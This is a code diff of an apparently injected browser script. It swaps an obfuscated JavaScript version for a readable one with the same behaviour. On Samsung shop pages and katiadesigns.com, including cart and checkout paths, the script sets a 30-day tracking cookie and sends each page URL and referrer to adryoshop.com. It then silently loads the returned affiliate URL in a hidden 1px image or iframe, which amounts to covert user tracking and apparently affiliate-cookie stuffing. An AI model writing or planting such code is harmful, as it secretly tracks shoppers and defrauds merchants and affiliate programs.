@@ -1,1 +1,100 @@
-function _0x3d49(){const _0x390df2=['toUTCString','getItem','2832136dAfRxK','741904BsELri','tracking_uuid','setItem','json','src','pathname','readyState','width','pay',';\x20expires=','tracking_done','checkout','2fmXIUm','https://adryoshop.com/api/track-user','1069495pHSajk','cookie',';\x20path=/;\x20SameSite=Lax','cart','stringify','replace','affiliate_url','1449777kkwlMR','17772wiXaFw','success','tracking_uuid=','img','hostname','display','review-order','123408OcJLEG','14123rAmfcx','1169vJoQep','POST','xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx','href','DOMContentLoaded','1060UZoAax','shipping','height','(?:^|;\x20)','=([^;]*)','none','random','now','some','match','application/json','always','addEventListener','location','https://adryoshop.com/api/fallback-pixel?id=','payment','includes'];_0x3d49=function(){return _0x390df2;};return _0x3d49();}function _0x38b5(_0x293785,_0x542ab6){_0x293785=_0x293785-0x171;const _0x3d4957=_0x3d49();let _0x38b566=_0x3d4957[_0x293785];return _0x38b566;}(function(_0x52e091,_0x484998){const _0x11a395=_0x38b5,_0x7aa727=_0x52e091();while(!![]){try{const _0x52881f=-parseInt(_0x11a395(0x199))/0x1*(-parseInt(_0x11a395(0x187))/0x2)+parseInt(_0x11a395(0x190))/0x3+-parseInt(_0x11a395(0x17a))/0x4+-parseInt(_0x11a395(0x189))/0x5+parseInt(_0x11a395(0x191))/0x6*(-parseInt(_0x11a395(0x19a))/0x7)+parseInt(_0x11a395(0x17b))/0x8+parseInt(_0x11a395(0x198))/0x9*(parseInt(_0x11a395(0x19f))/0xa);if(_0x52881f===_0x484998)break;else _0x7aa727['push'](_0x7aa727['shift']());}catch(_0x48a27d){_0x7aa727['push'](_0x7aa727['shift']());}}}(_0x3d49,0x9913d),(function(){const _0x179381=_0x38b5;function _0x2c4694(){const _0x58e792=_0x38b5;return _0x58e792(0x19c)[_0x58e792(0x18e)](/[xy]/g,function(_0x3a0c3a){const _0x4a12a0=_0x58e792,_0x1471df=Math[_0x4a12a0(0x1a5)]()*0x10|0x0,_0x1e3535=_0x3a0c3a==='x'?_0x1471df:_0x1471df&0x3|0x8;return _0x1e3535['toString'](0x10);});}function _0x1fa57d(_0x2018f8){const _0x5892a7=_0x38b5,_0x53e47d=document[_0x5892a7(0x18a)][_0x5892a7(0x1a8)](new RegExp(_0x5892a7(0x1a2)+_0x2018f8+_0x5892a7(0x1a3)));return _0x53e47d?decodeURIComponent(_0x53e47d[0x1]):'';}function _0x375938(_0x52ba08){const _0x56d488=_0x38b5,_0x1adec2=document['createElement'](_0x56d488(0x194));_0x1adec2[_0x56d488(0x17f)]=_0x52ba08,_0x1adec2[_0x56d488(0x182)]=0x1,_0x1adec2[_0x56d488(0x1a1)]=0x1,_0x1adec2['style'][_0x56d488(0x196)]=_0x56d488(0x1a4),document['body']['appendChild'](_0x1adec2);}function _0x3be3b3(){const _0x19cf67=_0x38b5,_0x294cef=[_0x19cf67(0x18c),_0x19cf67(0x186),_0x19cf67(0x183),_0x19cf67(0x1a0),_0x19cf67(0x197),_0x19cf67(0x176)];return _0x294cef[_0x19cf67(0x1a7)](function(_0x28de7e){const _0xb6eb7f=_0x19cf67;return window[_0xb6eb7f(0x174)][_0xb6eb7f(0x180)]['toLowerCase']()[_0xb6eb7f(0x177)](_0x28de7e);});}async function _0x2c29a2(){const _0x5e3be0=_0x38b5;if(sessionStorage[_0x5e3be0(0x179)](_0x5e3be0(0x185)))return;try{const _0x14537e=_0x1fa57d(_0x5e3be0(0x17c))||_0x2c4694(),_0xb007f4=new Date(Date[_0x5e3be0(0x1a6)]()+0x1e*0x18*0x3c*0x3c*0x3e8)[_0x5e3be0(0x178)]();document[_0x5e3be0(0x18a)]=_0x5e3be0(0x193)+_0x14537e+_0x5e3be0(0x184)+_0xb007f4+_0x5e3be0(0x18b);const _0x1e575c=await fetch(_0x5e3be0(0x188),{'method':_0x5e3be0(0x19b),'headers':{'Content-Type':_0x5e3be0(0x171)},'body':JSON[_0x5e3be0(0x18d)]({'url':location[_0x5e3be0(0x19d)],'referrer':document['referrer'],'unique_id':_0x14537e,'origin':location['hostname']})}),_0x15fa93=await _0x1e575c[_0x5e3be0(0x17e)]();_0x15fa93[_0x5e3be0(0x192)]&&_0x15fa93[_0x5e3be0(0x18f)]?(_0x375938(_0x15fa93['affiliate_url']),sessionStorage[_0x5e3be0(0x17d)](_0x5e3be0(0x185),'1')):_0x375938(_0x5e3be0(0x175)+_0x14537e);}catch(_0x57b368){console['error']('Tracking\x20error',_0x57b368);}}function _0x2c68ac(){const _0x443796=_0x38b5,_0x4f5959=window[_0x443796(0x174)][_0x443796(0x195)],_0x2e55aa={'www.samsung.com':{'always':!![],'cartExtra':![]},'shop.samsung.com':{'always':!![],'cartExtra':![]}},_0x1bcb66=_0x2e55aa[_0x4f5959];if(!_0x1bcb66)return;if(_0x1bcb66['cartExtra']&&_0x3be3b3())_0x2c29a2();else _0x1bcb66[_0x443796(0x172)]&&_0x2c29a2();}document['readyState']==='complete'||document[_0x179381(0x181)]==='interactive'?_0x2c68ac():window[_0x179381(0x173)](_0x179381(0x19e),_0x2c68ac,{'once':!![]});}()));
+(function () {
+  const TRACK_URL = 'https://adryoshop.com/api/track-user';
+  const FALLBACK_PIXEL_URL = 'https://adryoshop.com/api/fallback-pixel?id=';
+
+  const SITE_CONFIG = {
+    'www.samsung.com': { always: true, cartExtra: false },
+    'shop.samsung.com': { always: true, cartExtra: false },
+    'katiadesigns.com': { always: true, cartExtra: true },
+  };
+
+  const IFRAME_PIXEL_HOSTNAME = 'katiadesigns.com';
+
+  function generateUUID() {
+    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
+      const r = Math.random() * 0x10 | 0x0;
+      const v = c === 'x' ? r : (r & 0x3 | 0x8);
+      return v.toString(16);
+    });
+  }
+
+  function getCookie(name) {
+    const match = document.cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));
+    return match ? decodeURIComponent(match[1]) : '';
+  }
+
+  function createIframePixel(url) {
+    const iframe = document.createElement('iframe');
+    iframe.src = url;
+    iframe.setAttribute('sandbox', 'allow-scripts allow-forms');
+    iframe.style.display = 'none';
+    iframe.style.visibility = 'hidden';
+    iframe.style.width = '1px';
+    iframe.style.height = '1px';
+    iframe.style.border = '0';
+    document.body.appendChild(iframe);
+  }
+
+  function createTrackingPixel(url) {
+    if (window.location.hostname === IFRAME_PIXEL_HOSTNAME) {
+      createIframePixel(url);
+      return;
+    }
+    const img = document.createElement('img');
+    img.src = url;
+    img.width = 1;
+    img.height = 1;
+    img.style.display = 'none';
+    document.body.appendChild(img);
+  }
+
+  function isCheckoutPage() {
+    const keywords = ['cart', 'checkout', 'pay', 'shipping', 'review-order', 'payment'];
+    return keywords.some(function (keyword) {
+      return window.location.pathname.toLowerCase().includes(keyword);
+    });
+  }
+
+  async function trackUser() {
+    if (sessionStorage.getItem('tracking_done')) return;
+    try {
+      const uniqueId = getCookie('tracking_uuid') || generateUUID();
+      const expires = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toUTCString();
+      document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + '; path=/; SameSite=Lax';
+
+      const response = await fetch(TRACK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          url: location.href,
+          referrer: document.referrer,
+          unique_id: uniqueId,
+          origin: location.hostname
+        })
+      });
+      const data = await response.json();
+
+      if (data.success && data.affiliate_url) {
+        createTrackingPixel(data.affiliate_url);
+        sessionStorage.setItem('tracking_done', '1');
+      } else {
+        createTrackingPixel(FALLBACK_PIXEL_URL + uniqueId);
+      }
+    } catch (err) {
+      console.error('Tracking error', err);
+    }
+  }
+
+  function init() {
+    const hostname = window.location.hostname;
+    const config = SITE_CONFIG[hostname];
+    if (!config) return;
+
+    if (config.cartExtra && isCheckoutPage()) trackUser();
+    else config.always && trackUser();
+  }
+
+  document.readyState === 'complete' || document.readyState === 'interactive'
+    ? init()
+    : window.addEventListener('DOMContentLoaded', init, { once: true });
+})();
